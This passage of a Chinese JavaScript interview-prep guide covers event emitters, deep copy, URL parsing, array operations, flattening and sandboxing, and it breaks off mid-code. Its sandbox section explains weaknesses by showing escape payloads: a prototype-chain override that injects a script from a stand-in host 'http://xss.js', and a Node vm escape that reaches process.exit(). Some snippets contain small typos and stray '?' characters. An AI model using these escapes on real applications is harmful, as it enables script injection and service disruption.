        //由于需要在回调函数执行后，取消订阅当前事件，所以需要对传入的回调函数做一层包装,然后绑定包装后的函数
        const one=(...args)=>{
            // 执行回调函数
            callback(...args);
            //取消订阅当前事件
            this.off(eventName,one);
        }
        // 考虑：如果当前事件在未执行，被用户取消订阅，能否取消？
        // 由于：我们订阅事件的时候，修改了原回调函数的引用，所以，用户触发 off 的时候不能找到对应的回调函数
        // 所以，我们需要在当前函数与用户传入的回调函数做一个绑定，我们通过自定义属性来实现
        one.initialCallback=callback;
        this.on(eventName,one);
    }

}

//测试用例
const events=new EventEmitter();

events.on("newListener",function(eventName){
    console.log("eventName: ",eventName);
});

events.on("hello",function(){
    console.log("Hello World!");
});

let cb=function(){
    console.log("cb");
}
events.on("hello",cb);
events.off("hello",cb);

function once(){
    console.log("once");
}
events.on("hello",once);
events.off("hello",once);

events.emit("hello");
events.emit("hello");

```



------

## 9. 手写数组转树

**问题：**

```js
// 例如将 input 转成output的形式
let input = [
    {
        id: 1, val: '学校', parentId: null
    }, {
        id: 2, val: '班级1', parentId: 1
    }, {
        id: 3, val: '班级2', parentId: 1
    }, {
        id: 4, val: '学生1', parentId: 2
    }, {
        id: 5, val: '学生2', parentId: 2
    }, {
        id: 6, val: '学生3', parentId: 3
    },
]

let output = {
    id: 1,
    val: '学校',
    children: [{
        id: 2,
        val: '班级1',
        children: [
            {
                id: 4,
                val: '学生1',
                children: []
            },
            {
                id: 5,
                val: '学生2',
                children: []
            }
        ]
    }, {
        id: 3,
        val: '班级2',
        children: [{
            id: 6,
            val: '学生3',
            children: []
        }]
    }]
}

```



```js
// 代码实现
function arrayToTree(array) {
    let root = array[0]
    array.shift()
    let tree = {
        id: root.id,
        val: root.val,
        children: array.length > 0 ? toTree(root.id, array) : []
    }
    return tree;
}

function toTree(parenId, array) {
    let children = []
    let len = array.length
    for (let i = 0; i < len; i++) {
        let node = array[i]
        if (node.parentId === parenId) {
            children.push({
                id: node.id,
                val: node.val,
                children: toTree(node.id, array)
            })
        }
    }
    return children
}

console.log(arrayToTree(input))

```





------

## 10. 浅拷贝，深拷贝(实现方式)

浅拷贝和深拷贝都只针对于引用数据类型，**浅拷贝**只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但**深拷贝**会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；

区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；

实现**浅拷贝**方法

（1）Object.assign方法

```js
var obj = {
    a: 1,
    b: 2
}
var obj1 = Object.assign({},obj);
boj1.a = 3;
console.log(obj.a) // 3
```

（2）for in方法

```js
// 只复制第一层的浅拷贝
function simpleCopy(obj1) {
   var obj2 = Array.isArray(obj1) ? [] : {};
   for (let i in obj1) {
   obj2[i] = obj1[i];
  }
   return obj2;
}
var obj1 = {
   a: 1,
   b: 2,
   c: {
         d: 3
      }
}
var obj2 = simpleCopy(obj1);
obj2.a = 3;
obj2.c.d = 4;
console.log(obj1.a); // 1
console.log(obj2.a); // 3
console.log(obj1.c.d); // 4
console.log(obj2.c.d); // 4

```

实现**深拷贝**方法

（1）采用递归去拷贝所有层级属性

```js
function deepClone(obj){
    let objClone = Array.isArray(obj)?[]:{};
    if(obj && typeof obj==="object"){
        for(let key in obj){
            if(obj.hasOwnProperty(key)){
                //判断ojb子元素是否为对象，如果是，递归复制
                if(obj[key]&&typeof obj[key] ==="object"){
                    objClone[key] = deepClone(obj[key]);
                }else{
                    //如果不是，简单复制
                    objClone[key] = obj[key];
                }
            }
        }
    }
    return objClone;
}    
let a=[1,2,3,4];
let b=deepClone(a);
a[0]=2;
console.log(a,b);  //[ 2, 2, 3, 4 ] [ 1, 2, 3, 4 ]

```

（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；

```js
function deepCopy(obj1){
    let _obj = JSON.stringify(obj1);
    let obj2 = JSON.parse(_obj);
    return obj2;
}

var a = [1, [1, 2], 3, 4];
var b = deepCopy(a);
b[1][0] = 2;
console.log(a); // [ 1, [ 1, 2 ], 3, 4 ]
console.log(b); // [ 1, [ 2, 2 ], 3, 4 ]3,4

```

（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；

```js
var _ = require('lodash');
var obj1 = {
    a: 1,
    b: { f: { g: 1 } },
    c: [1, 2, 3]
};
var obj2 = _.cloneDeep(obj1);
console.log(obj1.b.f === obj2.b.f);
// false

```

------

## 11. 获取当前页面url

1. window.location.href (设置或获取整个 URL 为字符串)

```js
let href=window.location.href;
  console.log(href);  //http://127.0.0.1/test/test127.html
```

2. window.location.protocol (设置或获取 URL 的协议部分)

```js
 let protocol=window.location.protocol;
  console.log(protocol);  //http:
```

3. window.location.host (设置或获取 URL 的主机部分)

```js
let host=window.location.host;
  console.log(host);  //127.0.0.1
```

4. window.location.port (设置或获取与 URL 关联的端口号码)

```js
  let port=window.location.port;
  ////返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)
  console.log(port);  //
```

5. window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)

```js
let pathname=window.location.pathname;
  console.log(pathname);  ///test/test127.html
```

6. window.location.search (设置或获取 href 属性中跟在问号后面的部分)

```js
  let search=window.location.search;
  console.log(search);  //
```

7. window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)

```js
  let hash=window.location.hash;
  console.log(hash);
```

## 12.  js获取url中的参数值

正则法

```js
 function getQueryString(name) {
      var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
      var r = window.location.search.substr(1).match(reg);

      if (r != null) {
         return unescape(r[2]);
      }
      return null;
  }
// 这样调用：
alert(GetQueryString("参数名1"));
alert(GetQueryString("参数名2"));
alert(GetQueryString("参数名3"));

```

split拆分法

```js
function GetRequest() {
     var url = location.search; //获取url中"?"符后的字串
     var theRequest = new Object();

     if (url.indexOf("?") != -1) {
         var str = url.substr(1);
         strs = str.split("&");
          for(var i = 0; i < strs.length; i ++) {
                 theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
           }
     }
 	return theRequest;
 }
var Request = new Object();
Request = GetRequest();
// var id=Request["id"]; 
// var 参数1,参数2,参数3,参数N;
// 参数1 = Request['参数1'];
// 参数2 = Request['参数2'];
// 参数3 = Request['参数3'];
// 参数N = Request['参数N'];

```

指定取
比如说一个`http://i.cnblogs.com/?j=js`, 我们想得到参数j的值，可以通过以下函数调用。

```js
function GetQueryString(name) { 
     var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
     var r = window.location.search.substr(1).match(reg); //获取url中"?"符后的字符串并正则匹配
     var context = ""; 

     if (r != null) {
         context = r[2]; 
     }
     
    reg = null; 
    r = null; 
    return context == null || context == "" || context == "undefined" ? "" : context; 
 }
alert(GetQueryString("j"));

```

单个参数的获取方法

```js
function GetRequest() {
     var url = location.search; //获取url中"?"符后的字串
     if (url.indexOf("?") != -1) {? //判断是否有参数
          var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串
          strs = str.split("=");? //用等号进行分隔 （因为知道只有一个参数 
                                  //所以直接用等号进分隔 如果有多个参数 要用&号分隔 再用等号进行分隔）
          alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）
     }
  }

```





------

## 13. js中两个数组怎么取交集+(差集、并集、补集)

1. 最普遍的做法

   使用 **ES5** 语法来实现虽然会麻烦些，但兼容性最好，不用考虑浏览器 **JavaScript** 版本。也不用引入其他第三方库。

   直接使用 filter、concat 来计算

   ```js
   var a = [1,2,3,4,5]
   var b = [2,4,6,8,10]
   //交集
   var c = a.filter(function(v){ return b.indexOf(v) > -1 })
   //差集
   var d = a.filter(function(v){ return b.indexOf(v) === -1 })
   //补集
   var e = a.filter(function(v){ return !(b.indexOf(v) > -1) })
           .concat(b.filter(function(v){ return !(a.indexOf(v) > -1)}))
   //并集
   var f = a.concat(b.filter(function(v){ return !(a.indexOf(v) > -1)}));
   
   ```

   对 Array 进行扩展

   ```js
   //数组功能扩展
   //数组迭代函数
   Array.prototype.each = function(fn){
     fn = fn || Function.K;
      var a = [];
      var args = Array.prototype.slice.call(arguments, 1);
      for(var i = 0; i < this.length; i++){
          var res = fn.apply(this,[this[i],i].concat(args));
          if(res != null) a.push(res);
      }
      return a;
   };
   
   //数组是否包含指定元素
   Array.prototype.contains = function(suArr){
     for(var i = 0; i < this.length; i ++){
         if(this[i] == suArr){
             return true;
         }
      }
      return false;
   }
   
   //不重复元素构成的数组
   Array.prototype.uniquelize = function(){
      var ra = new Array();
      for(var i = 0; i < this.length; i ++){
         if(!ra.contains(this[i])){
             ra.push(this[i]);
         }
      }
      return ra;
   };
   
   //两个数组的交集
   Array.intersect = function(a, b){
      return a.uniquelize().each(function(o){return b.contains(o) ? o : null});
   };
   
   //两个数组的差集
   Array.minus = function(a, b){
      return a.uniquelize().each(function(o){return b.contains(o) ? null : o});
   };
   
   //两个数组的补集
   Array.complement = function(a, b){
      return Array.minus(Array.union(a, b),Array.intersect(a, b));
   };
   
   //两个数组并集
   Array.union = function(a, b){
      return a.concat(b).uniquelize();
   };
   
   ```

   

2. 使用 ES6 语法实现

   **ES6** 中可以借助扩展运算符（**...**）以及 **Set** 的特性实现相关计算，代码也会更加简单些。

   ```js
   var a = [1,2,3,4,5]
   var b = [2,4,6,8,10]
   console.log("数组a：", a);
   console.log("数组b：", b);
   
   var sa = new Set(a);
   var sb = new Set(b);
   
   // 交集
   let intersect = a.filter(x => sb.has(x));
   
   // 差集
   let minus = a.filter(x => !sb.has(x));
   
   // 补集
   let complement  = [...a.filter(x => !sb.has(x)), ...b.filter(x => !sa.has(x))];
   
   // 并集
   let unionSet = Array.from(new Set([...a, ...b]));
   
   ```

3. 使用 jQuery 实现

   ```js
   var a = [1,2,3,4,5]
   var b = [2,4,6,8,10]
   console.log("数组a：", a);
   console.log("数组b：", b);
   
   // 交集
   let intersect = $(a).filter(b).toArray();
   // 差集
   let minus = $(a).not(b).toArray();
   // 补集
   let complement  = $(a).not(b).toArray().concat($(b).not(a).toArray());
   // 并集
   let unionSet = $.unique(a.concat(b));
   
   ```

------

## 14. 用正则和非正则实现数字格式化

非正则：

如果数字带有小数点的话，可以使用toLocaleString()方法实现这个需求。

```js
let b=1234567890.12;
console.log(b.toLocaleString());  //1,234,567,890.12
```

正则：

1. 不带小数点

   ```js
   let b=1234567890;
   console.log(b.toString().replace(/(\d)(?=(?:\d{3})+$)/g,"$1,"));  //1,234,567,890
   ```

2. 带小数点

- 判读是否带有小数点
- 没有小数点，就用正则匹配实

```js
let num1=1234567890.32;
let num2=1234567890;

function numFormat(num) {
    var c = (num.toString().indexOf ('.') !== -1) ? num.toLocaleString() : 
             num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');
    return c;
}

console.log(numFormat(num1));  //1,234,567,890.32
console.log(numFormat(num2));  //1,234,567,890

```





------

## 15. 写一个判断是否是空对象的函数

```js
function isEmpty(value){
	return (value === null || value===undefined || (typeof value==="object" && Object.keys(value).length===0)		);
}

let str=[];
console.log(isEmpty(str));  //true
```

------

## 16. 颜色值16进制转10进制rgb

```js
function toRGB(color){
	var regex = /^#([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/;  //匹配十六进制的正则
	match = color.match(regex);  //// 判断是否是十六进制颜色值
	return match ? 'rgb('+parseInt(match[1], 16)+","+parseInt(match[2], 16)+","+parseInt(match[3], 16)+")" : color;
}

let str="#fd329b"
console.log(toRGB(str));  //rgb(253,50,155)
```



------

## 17. 拉平数组方法flat

### (1) 递归

我们最一开始能想到的莫过于循环数组元素，如果还是一个数组，就递归调用该方法：

```js
// 方法 1
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    var result = [];
    for (var i = 0, len = arr.length; i < len; i++) {
        if (Array.isArray(arr[i])) {
            result = result.concat(flatten(arr[i]))
        }
        else {
            result.push(arr[i])
        }
    }
    return result;
}
console.log(flatten(arr))

```

### (2) toString

如果数组的元素都是数字，那么我们可以考虑使用 toString 方法，因为：

```js
[1, [2, [3, 4]]].toString() // "1,2,3,4"
```

调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了吗？

```js
// 方法2
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    return arr.toString().split(',').map(function(item){
        return +item
    })
}

console.log(flatten(arr))  //[ 1, 2, 3, 4 ]

arr=[1, '1', 2, '2'];
console.log(flatten(arr))  //[ 1, 1, 2, 2 ]
```

然而这种方法使用的场景却非常有限，如果数组是 [1, '1', 2, '2'] 的话，这种方法就会产生错误的结果。

### (3) reduce

既然是对数组进行处理，最终返回一个值，我们就可以考虑使用 reduce 来简化代码：

```js
// 方法3
var arr = [1, [2, [3, 4]]];

function flatten(arr) {
    return arr.reduce(function(prev, next){
        return prev.concat(Array.isArray(next) ? flatten(next) : next)
    }, [])
}
console.log(flatten(arr))  //[ 1, 2, 3, 4 ]

```

### (4) ...扩展运算符

ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：

```js
var arr = [1, [2, [3, 4]]];
console.log([].concat(...arr)); // [1, 2, [3, 4]]

```

我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：

```js
// 方法4
var arr = [1, [2, [3, 4]]];

function flatten(arr) {

    while (arr.some(item => Array.isArray(item))) {
        arr = [].concat(...arr);
    }

    return arr;
}

console.log(flatten(arr))  //[ 1, 2, 3, 4 ]

```

### (5) undercore

那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~

在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。

```js
/**
 * 数组扁平化
 * @param  {Array} input   要处理的数组
 * @param  {boolean} shallow 是否只扁平一层
 * @param  {boolean} strict  是否严格处理元素，下面有解释
 * @param  {Array} output  这是为了方便递归而传递的参数
 * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528
 */
function flatten(input, shallow, strict, output) {

    // 递归使用的时候会用到output
    output = output || [];
    var idx = output.length;

    for (var i = 0, len = input.length; i < len; i++) {

        var value = input[i];
        // 如果是数组，就进行处理
        if (Array.isArray(value)) {
            // 如果是只扁平一层，遍历该数组，依此填入 output
            if (shallow) {
                var j = 0, length = value.length;
                while (j < length) output[idx++] = value[j++];
            }
            // 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output
            else {
                flatten(value, shallow, strict, output);
                idx = output.length;
            }
        }
        // 不是数组，根据 strict 的值判断是跳过不处理还是放入 output
        else if (!strict){
            output[idx++] = value;
        }
    }

    return output;

}

var arr = [1, [2, [3, 4]]];

console.log(flatten(arr,true,false))  //[ 1, 2, [ 3, 4 ] ]
console.log(flatten(arr,false,false))  //[ 1, 2, 3, 4 ]
```

解释下 strict，在代码里我们可以看出，**当遍历数组元素时，如果元素不是数组，就会对 strict 取反的结果进行判断**，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，举个例子：

```js
var arr = [1, 2, [3, 4]];
console.log(flatten(arr, true, true)); // [3, 4]

```

那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：

- shallow true + strict false ：正常扁平一层
- shallow false + strict false ：正常扁平所有层
- shallow true + strict true ：去掉非数组元素
- shallow false + strict true ： 返回一个[]

我们看看 underscore 中哪些方法调用了 flatten 这个基本函数：

**_.flatten**

首先就是 _.flatten：

```js
_.flatten = function(array, shallow) {
    return flatten(array, shallow, false);
};

```

在正常的扁平中，我们并不需要去掉非数组元素。

**_.union**

接下来是 _.union：

该函数传入多个数组，然后返回传入的数组的并集，

举个例子：

```js
_.union([1, 2, 3], [101, 2, 1, 10], [2, 1]);
=> [1, 2, 3, 101, 10]
```

如果传入的参数并不是数组，就会将该参数跳过：

```js
_.union([1, 2, 3], [101, 2, 1, 10], 4, 5);
=> [1, 2, 3, 101, 10]
```

为了实现这个效果，我们可以将传入的所有数组扁平化，然后去重，因为只能传入数组，这时候我们直接设置 strict 为 true，就可以跳过传入的非数组的元素。

```js
// 关于 unique 可以查看《JavaScript专题之数组去重》[](https://github.com/mqyqingfeng/Blog/issues/27)
function unique(array) {
   return Array.from(new Set(array));
}

_.union = function() {
    return unique(flatten(arguments, true, true));
}
```

**_.difference**

是不是感觉折腾 strict 有点用处了，我们再看一个 _.difference：

语法为：

```js
_.difference(array, *others)
```

效果是取出来自 array 数组，并且不存在于多个 other 数组的元素。跟 _.union 一样，都会排除掉不是数组的元素。

举个例子：

```js
_.difference([1, 2, 3, 4, 5], [5, 2, 10], [4], 3);
=> [1, 3]

```

实现方法也很简单，扁平 others 的数组，筛选出 array 中不在扁平化数组中的值：

```js
function difference(array, ...rest) {

    rest = flatten(rest, true, true);

    return array.filter(function(item){
        return rest.indexOf(item) === -1;
    })
}
```





------

## 18.  倒计时，一开始就进行

题意：一旦进入页面倒计时就开始，因此在window.onload方法中调用倒计时方法

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
</head>
<body>
    <div id="count"></div>

<script type="text/javascript">

window.onload=function(){
    countDown();
}
function addZero(i){
  return i < 10 ? "0"+i : i+"";
}
  
function countDown(){
  let nowtime=new Date();
  let endtime=new Date("2022/08/10,16:00:00");
  let lefttime=parseInt((endtime.getTime()-nowtime.getTime())/1000);

  if (lefttime <= 0) {
    document.querySelector("#count").innerHTML="活动已结束";
    return;
  }

  let d=addZero(parseInt(lefttime/(24*60*60)));
  let h=addZero(parseInt(lefttime/(60*60)%24));
  let m=addZero(parseInt(lefttime/60%60));
  let s=addZero(parseInt(lefttime%60));

  document.querySelector("#count").innerHTML=`活动倒计时  ${d}天 ${h} 时 ${m} 分 ${s} 秒`;
  setTimeout(countDown,1000);
}

</script>
</body>
</html>
```

------

## 19. 沙箱隔离怎么做的什么原理

沙箱，即sandbox，顾名思义，**就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响**，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。

实现沙箱的三种方法

### (1) 借助with + new Function

首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：

```js
function compileCode (src) {      
  src = 'with (exposeObj) {' + src + '}'    
  return new Function('exposeObj', src)     
}
```

接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：

```js
function compileCode (src) {      
  src = `with (exposeObj) { ${src} }`    
  return new Function('exposeObj', src)     
}    
function proxyObj(originObj){    
    let exposeObj = new Proxy(originObj,{    
        has:(target,key)=>{    
            if(["console","Math","Date"].indexOf(key)>=0){    
                return target[key]    
            }    
            if(!target.hasOwnProperty(key)){    
                throw new Error(`Illegal operation for key ${key}`)    
            }    
            return target[key]    
        },
    })    
    return exposeObj    

}    
function createSandbox(src,obj){    
 let proxy = proxyObj(obj)    
 compileCode(src).call(proxy,proxy) //绑定this 防止this访问window    
}
```

通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：

```js
const testObj = {    
    value:1,    
    a:{    
        b:    
    }    
}    
createSandbox("value='haha';console.log(a)",testObj)
```

看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.**proto**就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。

```js
createSandbox(`    
a.b.__proto__.toString = ()=>{    
 new (()=>{}).constructor("var script = document.createElement('script');    
 script.src = 'http://xss.js';
 script.type = 'text/javascript';    
 document.body.appendChild(script);")()    
}
`,testObj)    
console.log(testObj.a.b.__proto__.toString())
```

例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用域链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。

你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过**proto**查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：

```js
({}).__proto__.toString= ()=>{console.log(111)};
```

可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。

### (2) 借助iframe实现沙箱

前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱

```html
<iframe sandbox src="..."></iframe>
```

但是这也会带来一些限制：

1. script脚本不能执行

2. 不能发送ajax请求

3. 不能使用本地存储，即localStorage,cookie等

4. 不能创建新的弹窗和window

5. 不能发送表单

6. 不能加载额外插件比如flash等

   不过别方，你可以对这个iframe标签进行一些配置：

   ![img](https://uploadfiles.nowcoder.com/images/20220301/4107856_1646122570684/3FD065D9D9BD5924FC83D859A251A3C9)

接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。

1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。

2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。

3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制

简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。

### (3) nodejs中的沙箱

nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```js
const vm = require('vm');    
const x = 1;    
const sandbox = { x: 2 };    
vm.createContext(sandbox); // Contextify the sandbox.    
const code = 'x += 40; var y = 17;';    
vm.runInContext(code, sandbox);    
console.log(sandbox.x); // 42    
console.log(sandbox.y); // 17    
console.log(x); // 1;   y is not defined.
```

vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

但是vm是绝对安全的吗？不一定。

```js
const vm = require('vm');    
vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过**原型链逃逸**（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。

```js
let ctx = Object.create(null);    
ctx.a = 1; // ctx上不能包含引用类型的属性    
vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx);
```

让我们来看一下TSW中是怎么使用的：

```js
const vm = require('vm');    
const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆    
...    
if (opt.jsonpCallback) {    
  code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;    
  obj = new SbFunction(code)();    
}     
...    
```

通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。



------

## 20. 生成长度是N，且在min、max内不重复的整数随机数组



把考点拆成了4个小项；需要用递归算法实现：
a) 生成一个长度为n的空数组arr。
b) 生成一个（min－max）之间的随机整数rand。
c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环]
d) 最终输出一个长度为n，且内容不重复的数组arr。

```js
function buildArray(arr, n, min, max){
    let num = Math.floor(Math.random() * (max - min + 1)) + min;
    if (!arr.includes(num)) {
        arr.push(num);
    }
    return arr.length === n ? arr : buildArray(arr, n, min, max);
}

const result=buildArray([], 20, 2, 100);
console.log(result);
```



------

## 21. 字符串中的单词逆序输出（手写）

方法一：

```js
function strReverse(str) {
     return str.split("").reverse().join("") 
}
```

方法二：

```js
function strReverse(str) {
        var i=str.length;
        var nstr = ""; 
        i=i-1; 
        for (var x = i; x >=0; x--) { 
                nstr+=str.charAt(x)
        }
        return nstr
}
```

方法三：

```js
function strReverse(str) {
        if(str.length == 0)return null; 
        var i = str.length; 
        var dstr = ""; 
        while(--i >= 0) 
        { 
            dstr += str.charAt(i);  
        } 
        return dstr; 
}

```

方法四：

```js
function strReverse(str) {
    return str.split('').reduce((prev, next) => next + prev);
}

```

方法五：

```js
function strReverse(str) {
        var newstr="";
           for(var i=0;i<str.length;i++){
               newstr=str.charAt(i)+newstr;
           }
           return newstr
}

```

方法六：

```js
function strReverse(str) {
            if(str.length===1){
                return str
            }
            return str.slice(-1)+strReverse(str.slice(0,-1));
}
```

------

## 22.  给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度

思路分析：

对字符串进行遍历，使用String.prototype.indexOf()实时获取遍历过程中的无重复子串并存放于str，并保存当前状态最长无重复子串的长度为res，当遍历结束时，res的值即为无重复字符的最长子串的长度。

代码示例：

```js
/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLongestSubstring = function(s) {
    var res = 0; // 用于存放当前最长无重复子串的长度
    var str = ""; // 用于存放无重复子串
    var len = s.length;
    for(var i = 0; i < len; i++) {
      var char = s.charAt(i);
      var index = str.indexOf(char);
      if(index === -1) {
        str += char;
        res = res < str.length ? str.length : res;
      } else {
        str = str.substr(index + 1) + char;
      }
    }
    return res; 
};

```





------

## 23. 去掉字符串前后的空格

第五种方法在处理长字符串时效率最高

第一种：循环检查替换

```js
//供使用者调用  
function trim(s){  
    return trimRight(trimLeft(s));  
}  
//去掉左边的空白  
function trimLeft(s){  
    if(s == null) {  
        return "";  
    }  
    var whitespace = new String(" \t\n\r");  
    var str = new String(s);  
    if (whitespace.indexOf(str.charAt(0)) !== -1) {  
        var j=0, i = str.length;  
        while (j < i && whitespace.indexOf(str.charAt(j)) !== -1){  
            j++;  
        }  
        str = str.substring(j, i);  
    }  
    return str;  
}  
//去掉右边的空白 
function trimRight(s){  
    if(s == null) return "";  
    var whitespace = new String(" \t\n\r");  
    var str = new String(s);  
    if (whitespace.indexOf(str.charAt(str.length-1)) !== -1){  
        var i = str.length - 1;  
        while (i >= 0 && whitespace.indexOf(str.charAt(i)) != -1){  
            i--;  
        }  
        str = str.substring(0, i+1);  
    }  
    return str;  
} 

```

第二种：正则替换

```js

String.prototype.Trim = function()  {  
    return this.replace(/(^\s*)|(\s*$)/g, "");  
}  
String.prototype.LTrim = function()  {  
    return this.replace(/(^\s*)/g, "");  
}  
String.prototype.RTrim = function()  {  
    return this.replace(/(\s*$)/g, "");  
}  

```

第三种：使用jquery

```js
$.trim(str) 
//jquery内部实现为：
function trim(str){   
    return str.replace(/^(\s|\u00A0)+/,'').replace(/(\s|\u00A0)+$/,'');   
}   
```

第四种：使用motools

```js
function trim(str){   
    return str.replace(/^(\s|\xA0)+|(\s|\xA0)+$/g, '');   
}  

```

第五种：裁剪字符串方式

```js
function trim(str){   
    str = str.replace(/^(\s|\u00A0)+/,'');   
    for(var i=str.length-1; i>=0; i--){   
        if(/\S/.test(str.charAt(i))){   
            str = str.substring(0, i+1);   
            break;   
        }   
    }   
    return str;   
}  

```

------

## 24. 三数之和

题目描述

给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。

注意：答案中不可以包含重复的三元组。

```
//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，
//满足要求的三元组集合为：
[
  [-1, 0, 1],
  [-1, -1, 2]
]
```

解答

这题我们才用排序+双指针的思路来做，遍历排序后的数组，定义指针l和r,分别从当前遍历元素的下一个元素和数组的最后一个元素往中间靠拢，计算结果跟目标对比。

```js
var threeSum = function(nums) {
    if(nums.length < 3){
        return [];
    }

    let res = [];
    // 排序
    nums.sort((a, b) => a - b);
    for(let i = 0; i < nums.length; i++){
        if(i > 0 && nums[i] == nums[i-1]){
            // 去重
            continue;
        }
        if(nums[i] > 0){
            // 若当前元素大于0，则三元素相加之后必定大于0
            break;
        }
        // l为左下标，r为右下标
        let l = i + 1; r = nums.length - 1;
        while(l<r){
            let sum = nums[i] + nums[l] + nums[r];
            if(sum == 0){
                res.push([nums[i], nums[l], nums[r]]);
                while(l < r && nums[l] == nums[l+1]){
                    l++
                }
